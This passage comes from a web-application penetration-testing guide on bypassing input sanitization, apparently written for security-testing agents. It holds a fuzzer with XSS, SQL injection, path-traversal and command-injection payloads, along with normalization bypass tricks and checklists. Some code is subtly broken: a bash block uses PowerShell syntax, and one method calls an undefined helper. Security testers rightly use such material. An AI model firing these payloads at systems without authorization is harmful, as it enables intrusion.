        print()
```

---

## Normalization Attacks

### URL Normalization Differences

Different components normalize URLs differently:

```python
def test_url_normalization(target_url):
    """Test URL normalization differences between components."""
    path_variants = [
        '/api/user/123',
        '/./api/user/123',
        '/api/./user/123',
        '/api/user/123/.',
        '/api/user/123/..',
        '/api/user/../user/123',
        '//api/user/123',
        '/api//user/123',
        '/api/user//123',
        '/api/user/123/',
        '/api/user/123%00',
        '/api/user/123#fragment',
        '/api/user/123?query=true',
        '/Api/User/123',
        '/API/USER/123',
        '/api%2fuser%2f123',
        '/api/user/123;jsessionid=abc123',
    ]

    results = []
    base = requests.get(f"{target_url}/api/user/123").status_code

    for variant in path_variants:
        r = requests.get(f"{target_url}{variant}")
        results.append({
            'variant': variant,
            'status': r.status_code,
            'redirect': r.headers.get('Location', ''),
            'differs': r.status_code != base,
        })

    return results

# Key insight: If /api/user/123 and /Api/User/123 return different responses,
# there may be a normalization bypass for WAF or path-based middleware.
```

### UTF-8 Normalization Issues

```python
import unicodedata

def generate_normalization_variants(payload):
    """Generate Unicode normalization variants of a payload."""
    variants = {}

    # NFC (Canonical Composition)
    variants['NFC'] = unicodedata.normalize('NFC', payload)

    # NFD (Canonical Decomposition)
    variants['NFD'] = unicodedata.normalize('NFD', payload)

    # NFKC (Compatibility Composition)
    variants['NFKC'] = unicodedata.normalize('NFKC', payload)

    # NFKD (Compatibility Decomposition)
    variants['NFKD'] = unicodedata.normalize('NFKD', payload)

    return variants

# Example: Payload containing "alert"
# NFD: "ale\u0300rt" (with combining grave accent)
# The WAF checks for "alert" → doesn't find it
# The browser renders the combining character → user sees "alert"
```

### Unicode Equivalence Attacks (NFD/NFC/NFKC/NFKD)

| Normal Form | Description | Bypass Use |
|-------------|-------------|------------|
| NFC | Canonical composition | `e +  ́ → é` — hard to read |
| NFD | Canonical decomposition | `é → e +  ́` — characters split |
| NFKC | Compatibility composition | `ﬁ → fi` — ligature expansion |
| NFKD | Compatibility decomposition | `ℓ → l` — special chars to ASCII |

**Java/C# Unicode normalization bypasses:**

```java
// Java string validation
String input = request.getParameter("name");
if (input.contains("<script>")) {
    throw new SecurityException();
}
// If not normalized, \uFF1C (fullwidth less-than) is NOT "<"
// \uFF1Cscript\uFF1E → fullwidth angle brackets
// Some browsers normalize to <script>!
```

**Python normalization bypass:**

```python
# Python doesn't auto-normalize by default
import unicodedata

def test_normalization_bypass(payload):
    """Test if normalization changes payload behavior."""
    # Payload with confusable characters
    confusable = {
        '<': ['\uFF1C', '\u276C', '\u27E8', '\u3008', '\u2329', '\u2039'],
        '>': ['\uFF1E', '\u276D', '\u27E9', '\u3009', '\u232A', '\u203A'],
        "'": ['\u2018', '\u2019', '\u02BC', '\u2032', '\u055A'],
        '"': ['\u201C', '\u201D', '\u301D', '\u3003', '\u2033'],
        '/': ['\u2215', '\u2044', '\uFF0F', '\u29F8'],
        '.': ['\u2024', '\uFF0E', '\u3002', '\u0387'],
        '\\': ['\uFF3C', '\u2216', '\u29F5', '\u27CD'],
        '(': ['\uFF08', '\u207D', '\u208D', '\u2768'],
        ')': ['\uFF09', '\u207E', '\u208E', '\u2769'],
    }

    for char, alternatives in confusable.items():
        for alt in alternatives:
            variant = payload.replace(char, alt)
            print(f"  {repr(char)} → {repr(alt)}: {variant[:40]}")
```

### Directory Path Normalization

Different libraries normalize paths differently:

```python
import os
import posixpath
from urllib.parse import urljoin, urlparse

def test_path_normalization_differences():
    """Demonstrate path normalization differences between libraries."""
    test_paths = [
        '/api/user/123/../../../etc/passwd',
        'api/user/../../etc/passwd',
        '/./api/./user/./123',
        '//api///user//123',
        '/api/user/123/',
        '/api/user/%2e%2e/%2e%2e/etc/passwd',
        '/api/user/.../.../etc/passwd',
        '/api/user/123/.../.../etc/passwd',
    ]

    print(f"{'Path':<50} {'os.path':<30} {'posixpath':<30} {'urljoin':<30}")
    print("-" * 140)

    for path in test_paths:
        ospath = os.path.normpath(path)
        posix = posixpath.normpath(path)
        try:
            joined = urljoin('http://example.com', path)
        except:
            joined = 'ERROR'

        print(f"{path:<50} {ospath:<30} {posix:<30} {joined:<30}")

# Key insight:
# os.path.normpath("//api//user//123")  → "\\api\\user\\123" (Windows)
# posixpath.normpath("//api//user//123") → "/api/user/123" (Linux)
# urljoin("/api/user/123", "..") → "/api/user/" (different resolution)
```

**Path normalization bypass for access controls:**

```python
# If middleware checks for access to /api/admin:
# Middleware sees: /api/user/123 (allowed)
# Application resolves: /api/admin/users (actual path)

# Technique: Use '..' within the path
/api/user/../../admin/users
/api/user/..%2Fadmin%2Fusers
/api/user/..\admin\users  (Windows)
/api/user/..%255c..%255cadmin  (Double-encoded Windows)

# Technique: Use path parameters (different component handling)
/api/user/123;/../admin/users
/api/user/123;..;/admin/users
```

---

## Bypass Automation

### Custom Bypass Scripts

```python
import requests
import re
import itertools
from urllib.parse import quote
from typing import List, Dict, Optional

class SanitizationBypassFuzzer:
    """Automated sanitization bypass fuzzer."""

    def __init__(self, base_url: str, auth_header: Optional[str] = None):
        self.base_url = base_url
        self.headers = {'Authorization': auth_header} if auth_header else {}
        self.results = []

    def load_payloads(self, payload_file: str) -> List[str]:
        """Load payloads from a file."""
        with open(payload_file, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]

    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS payload variations."""
        base = '<script>alert(1)</script>'
        variants = [
            base,
            '<ScRiPt>alert(1)</ScRiPt>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '" autofocus onfocus=alert(1) x="',
            "'-alert(1)-'",
            '{{7*7}}',
            '${7*7}',
        ]
        return variants

    def generate_sqli_payloads(self) -> List[str]:
        """Generate SQLi payload variations."""
        variants = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1 #",
            '\' OR 1=1 --',
            '\' OR \'1\'=\'1',
            '" OR "1"="1',
            "1' OR '1'='1'/*",
            "' UNION SELECT NULL--",
            'admin\' --',
            'admin\' #',
            'admin\'/*',
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' UNION SELECT 1,2,3--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ]
        return variants

    def generate_path_traversal_payloads(self) -> List[str]:
        """Generate path traversal payload variations."""
        variants = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            '....//....//....//etc/passwd',
            '..%252f..%252f..%252fetc/passwd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '..\\..\\..\\etc/passwd',
            '/etc/passwd',
            'file:///etc/passwd',
        ]
        return variants

    def generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection payload variations."""
        variants = [
            ';id',
            '|id',
            '`id`',
            '$(id)',
            ';whoami',
            '|whoami',
            '& ping -n 1 127.0.0.1 &',
            '|| ping -n 1 127.0.0.1',
            '&& whoami',
            '%0aid',
            '%0Aid',
            '`sleep 5`',
            '$(sleep 5)',
        ]
        return variants

    def fuzz_endpoint(
        self,
        endpoint: str,
        param: str,
        payloads: List[str],
        method: str = 'POST',
        success_indicators: Optional[List[str]] = None
    ) -> List[Dict]:
        """Fuzz an endpoint with payloads and detect bypasses."""
        url = f"{self.base_url}/{endpoint}"
        success_indicators = success_indicators or ['error', 'syntax', 'mysql', 'sql']

        for payload in payloads:
            try:
                if method == 'POST':
                    r = requests.post(
                        url,
                        json={param: payload},
                        headers=self.headers,
                        timeout=10
                    )
                else:
                    r = requests.get(
                        f"{url}?{param}={quote(payload)}",
                        headers=self.headers,
                        timeout=10
                    )

                # Check for bypass indicators
                indicators = []
                if r.status_code == 200:
                    indicators.append('status_200')
                if r.elapsed.total_seconds() > 3:
                    indicators.append('slow_response')
                if payload in r.text:
                    indicators.append('payload_reflected')
                if any(ind in r.text.lower() for ind in success_indicators):
                    indicators.append('error_indicators')

                if indicators:
                    self.results.append({
                        'endpoint': endpoint,
                        'param': param,
                        'payload': payload[:50],
                        'status': r.status_code,
                        'indicators': indicators,
                        'response_preview': r.text[:100],
                    })

            except requests.exceptions.Timeout:
                self.results.append({
                    'endpoint': endpoint,
                    'param': param,
                    'payload': payload[:50],
                    'status': 'TIMEOUT',
                    'indicators': ['timeout'],
                    'response_preview': '',
                })

        return self.results

    def test_all_endpoints(self, endpoints: List[Dict]):
        """Run fuzz tests against multiple endpoints."""
        for ep in endpoints:
            self.fuzz_endpoint(
                endpoint=ep['path'],
                param=ep['param'],
                payloads=self.generate_xss_payloads(),
                method=ep.get('method', 'POST'),
            )
            self.fuzz_endpoint(
                endpoint=ep['path'],
                param=ep['param'],
                payloads=self.generate_sqli_payloads(),
                method=ep.get('method', 'POST'),
            )
            self.fuzz_endpoint(
                endpoint=ep['path'],
                param=ep['param'],
                payloads=self.generate_path_traversal_payloads(),
                method=ep.get('method', 'POST'),
            )

        return self.results
```

### PayloadAllTheThings Integration

Integrate with the PayloadAllTheThings repository:

```bash
# Clone the repo
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git ./payloads

# Use XSS payloads
$payloads = Get-Content ./payloads/XSS/xss-payload-list.txt

# Use SQLi payloads
$sqli = Get-Content ./payloads/SQL Injection/Intruder/Auth_Bypass.txt

# Use SSTI payloads
$ssti = Get-Content ./payloads/SSTI/intruder.txt
```

**Organized payload structure:**

```python
payload_sources = {
    'xss': {
        'polyglot': 'payloads/XSS/Polyglot.txt',
        'event_handlers': 'payloads/XSS/Event_Handlers.txt',
        'csp_bypass': 'payloads/XSS/CSP_Bypass.txt',
        'svg_xss': 'payloads/XSS/SVG_XSS.txt',
        'waf_bypass': 'payloads/XSS/WAF_ByPass.txt',
    },
    'sqli': {
        'generic': 'payloads/SQL Injection/Generic_TimeBased.txt',
        'mssql': 'payloads/SQL Injection/MSSQL Injection.txt',
        'mysql': 'payloads/SQL Injection/MySQL Injection.txt',
        'postgres': 'payloads/SQL Injection/PostgreSQL Injection.txt',
        'blind': 'payloads/SQL Injection/Blind SQL injection.txt',
    },
    'ssti': {
        'jinja2': 'payloads/SSTI/Jinja2_Without_File.txt',
        'twig': 'payloads/SSTI/Twig.txt',
        'freemarker': 'payloads/SSTI/Freemarker.txt',
    },
}
```

### Custom Regex Fuzzer

Fuzz the validation regex itself to find edge cases:

```python
import re
import itertools

class RegexFuzzer:
    """Fuzz regex-based validation to find bypasses."""

    def __init__(self, pattern: str, flags=0):
        self.regex = re.compile(pattern, flags)

    def fuzz_with_inputs(self, inputs: List[str]) -> List[Dict]:
        """Test which inputs pass/fail the regex."""
        results = []
        for inp in inputs:
            match = self.regex.fullmatch(inp) or self.regex.search(inp)
            results.append({
                'input': inp[:50],
                'matches': bool(match),
                'match_group': match.group() if match else None,
                'match_pos': match.span() if match else None,
            })
        return results

    def find_regex_edge_cases(self) -> List[str]:
        """Generate edge case inputs for regex testing."""
        edge_cases = [
            # Empty and whitespace
            '',
            ' ',
            '\t',
            '\n',
            '\r\n',

            # Special characters
            '*',
            '.',
            '+',
            '?',
            '^',
            '$',
            '|',
            '(',
            ')',
            '[',
            ']',
            '{',
            '}',
            '\\',
            '\0',

            # Unicode edge cases
            '\u0000',
            '\u00FF',
            '\u0100',
            '\uFFFF',
            '\U0010FFFF',

            # ReDoS triggers
            'A' * 30 + '!',
            'a' * 30 + '!',
            '1234567890' * 10,

            # Very long input
            'A' * 10000,

            # Mixed content
            'A' * 100 + '<script>alert(1)</script>',
            '<script>alert(1)</script>' + 'A' * 100,
        ]
        return edge_cases

    def detect_regex_pattern(self, sample_inputs: List[bool]) -> Dict:
        """Infer the regex pattern from accepted/rejected inputs."""
        patterns = {
            'alphanumeric': all(c.isalnum() for c in self._get_accepted_chars()),
            'no_html_tags': '<script>' not in self._get_accepted([sample_inputs]),
            'email_format': '@' in self._get_accepted([sample_inputs]),
            'url_format': 'http' in self._get_accepted([sample_inputs]),
        }
        return patterns

    def _get_accepted_chars(self) -> List[str]:
        accepted = []
        for c in map(chr, range(32, 127)):
            if self.regex.search(c):
                accepted.append(c)
        return accepted
```

### Filter Response Analysis Automation

Analyze responses to determine filter behavior:

```python
import numpy as np

class FilterResponseAnalyzer:
    """Analyze response patterns to reverse-engineer sanitization logic."""

    def __init__(self):
        self.responses = []

    def record_response(self, payload: str, status: int, body: str, headers: Dict):
        """Record a filter response for analysis."""
        self.responses.append({
            'payload': payload,
            'status': status,
            'body_length': len(body),
            'body': body,
            'headers': headers,
            'has_error': self._has_error(body),
            'has_reflection': self._has_reflection(payload, body),
        })

    def _has_error(self, body: str) -> bool:
        """Check if response indicates a filter/rejection."""
        indicators = [
            'invalid', 'blocked', 'rejected', 'forbidden', 'error',
            'malicious', 'suspicious', 'bad request', '400', '403',
        ]
        return any(ind in body.lower() for ind in indicators)

    def _has_reflection(self, payload: str, body: str) -> bool:
        """Check if payload is reflected in response."""
        # Check partial reflections (truncation, encoding)
        fragment = payload[:20]
        return fragment in body

    def analyze_filter_type(self) -> str:
        """Determine if filter is blacklist, whitelist, or output encoding."""
        if len(self.responses) < 5:
            return "insufficient_data"

        # Analyze error vs acceptance patterns
        accepted = [r for r in self.responses if not r['has_error']]
        rejected = [r for r in self.responses if r['has_error']]

        if not rejected:
            return "no_filter"

        # Check if rejected payloads share a common pattern
        rejected_payloads = [r['payload'] for r in rejected]
        common_patterns = self._find_common_patterns(rejected_payloads)

        if len(common_patterns) <= 2:
            return "blacklist"  # Only rejects specific patterns

        # Check reflection patterns
        reflection_rate = sum(1 for r in accepted if r['has_reflection']) / max(len(accepted), 1)
        if reflection_rate > 0.8 and accepted:
            return "html_encoding"  # Reflected but encoded

        return "whitelist_or_mixed"

    def _find_common_patterns(self, payloads: List[str]) -> List[str]:
        """Find substrings common to all rejected payloads."""
        if not payloads:
            return []

        # Check for common HTML tags
        tags = ['<script>', '<img', '<svg', '<body', 'onerror', 'onload', 'onfocus']
        found = []
        for tag in tags:
            if any(tag in p.lower() for p in payloads):
                found.append(tag)
        return found

    def summarize(self) -> Dict:
        """Generate a summary of filter behavior."""
        total = len(self.responses)
        rejected = sum(1 for r in self.responses if r['has_error'])
        reflected = sum(1 for r in self.responses if r['has_reflection'])

        return {
            'total_requests': total,
            'rejected': rejected,
            'accepted': total - rejected,
            'rejection_rate': rejected / total if total > 0 else 0,
            'reflection_rate': reflected / total if total > 0 else 0,
            'filter_type': self.analyze_filter_type(),
            'avg_response_length': np.mean([r['body_length'] for r in self.responses]) if self.responses else 0,
        }
```

### Regression Detection for Filter Updates

Monitor applications for changes in filter behavior over time:

```python
class RegressionDetector:
    """Detect changes in sanitization behavior over time."""

    def __init__(self, baseline_file: str):
        self.baseline = self._load_baseline(baseline_file)

    def _load_baseline(self, path: str) -> Dict:
        """Load a baseline of known filter behavior."""
        import json
        with open(path, 'r') as f:
            return json.load(f)

    def test_against_baseline(self, current_results: List[Dict]) -> List[Dict]:
        """Compare current results against baseline."""
        regressions = []

        for result in current_results:
            key = f"{result['endpoint']}:{result['payload']}"
            baseline_result = self.baseline.get(key)

            if baseline_result:
                # Previously blocked → now accepted (regression)
                if baseline_result['blocked'] and not result['blocked']:
                    regressions.append({
                        'type': 'regression',
                        'endpoint': result['endpoint'],
                        'payload': result['payload'][:50],
                        'old_status': baseline_result['status'],
                        'new_status': result['status'],
                        'description': 'Previously blocked payload now accepted',
                    })

                # Previously accepted → now blocked (hardening)
                if not baseline_result['blocked'] and result['blocked']:
                    regressions.append({
                        'type': 'hardening',
                        'endpoint': result['endpoint'],
                        'payload': result['payload'][:50],
                        'old_status': baseline_result['status'],
                        'new_status': result['status'],
                        'description': 'Filter was updated to block this payload',
                    })

        return regressions
```

---

## Checklist

### Sanitization Detection Checklist

- [ ] Identify all input points: URL params, body fields, headers, cookies, file uploads, GraphQL queries
- [ ] Map sanitization layers: client JS, server middleware, application logic, template engine, database
- [ ] Test client-side validation bypass by sending direct API requests (Burp, curl, Python)
- [ ] Identify field-level vs global validation — are all endpoints equally validated?
- [ ] Check for content-type based validation differences (JSON vs form vs multipart)
- [ ] Test parameter pollution (same parameter multiple times)
- [ ] Test different HTTP methods (POST vs PUT vs PATCH vs GET)
- [ ] Check if validation applies to nested/embedded objects
- [ ] Identify the validation strategy: blacklist or whitelist
- [ ] If blacklist, enumerate exactly which patterns are blocked
- [ ] If whitelist, identify the allowed character set
- [ ] Test multi-byte encoding bypasses (UTF-8 overlong, GBK, Shift-JIS)
- [ ] Test double-encoding (URL, HTML entity, Unicode)
- [ ] Test normalization differences (NFC/NFD/NFKC/NFKD)
- [ ] Test null byte injection for truncation bypass
- [ ] Test length truncation before vs after validation
- [ ] Test type coercion (string vs array vs object vs null vs boolean)
- [ ] Check for ReDoS vulnerability in regex-based validation
- [ ] Test response headers for encoding hints (Content-Type, CSP, X-XSS-Protection)

### Filter Bypass Test Checklist

- [ ] HTML tag injection: different tags, unclosed tags, nested tags, malformed tags
- [ ] Script execution: event handlers, SVG, iframe srcdoc, import scripts, JSONP
- [ ] Keyword blacklist: case variation, encoding, comment splitting, partial match
- [ ] SQL injection: comment sequences, operator substitution, hex encoding, case variation
- [ ] SSTI: alternative delimiters, filter override, expression vs statement, attr filter
- [ ] Command injection: IFS manipulation, wildcard, env vars, base64, newline splitting
- [ ] Path traversal: double encoding, unicode, nested traversal, null byte, absolute path
- [ ] File upload: double extension, null byte, magic byte polyglot, .htaccess, case variation
- [ ] MIME type: Content-Type manipulation, multipart boundary, header injection
- [ ] CSP bypass: eval, script src whitelist, JSONP, Angular/prototype.js
- [ ] CORS bypass: origin reflection, null origin, wildcard with credentials
- [ ] HTTP verb tampering: GET vs POST, HEAD, OPTIONS, PATCH, TRACE
- [ ] Request smuggling: CL.TE, TE.CL, H2.CL, H2.TE
- [ ] Cache poisoning: unkeyed headers, user-specific content with shared caches
- [ ] Rate limiting bypass: headers (X-Forwarded-For), IP rotation, distributed attacks

### Output Encoding Validation Checklist

- [ ] Test HTML context: entity encoding of `<`, `>`, `&`, `"`, `'`
- [ ] Test attribute context: quote breaking, event handler injection, space insertion
- [ ] Test JavaScript context: string delimiter break, template literal, script tag close
- [ ] Test CSS context: expression, url(), @import, behavior property
- [ ] Test URL context: protocol handler (javascript:, data:, vbscript:), encoding bypass
- [ ] Test JSON context: string escape bypass, script tag close in inline JSON
- [ ] Test XML context: XXE injection, CDATA breakout, XPath injection
- [ ] Test for auto-escape bypass: disabled per field, raw/safe filters, |safe in templates
- [ ] Test template engine context confusion: HTML vs JS vs CSS vs URL
- [ ] Verify Content-Type header matches output context
- [ ] Check X-Content-Type-Options: nosniff header
- [ ] Check CSP header covers all output contexts (script-src, style-src, object-src)
- [ ] Test both stored (persistent) and reflected (non-persistent) output
- [ ] Test output in different formats: HTML, JSON, XML, CSV, PDF
- [ ] Test output in different locations: main page, email, export, admin panel, error page
- [ ] Test multipart output: single value rendered in multiple contexts

---

## Reference

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Output Encoding Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Output_Encoding_Cheat_Sheet.html)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PortSwigger Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)
- See also: `agents/xss-hunter.md`, `agents/sqli-hunter.md`, `agents/ssti-hunter.md`, `agents/file-upload-hunter.md`, `rules/scope.md`
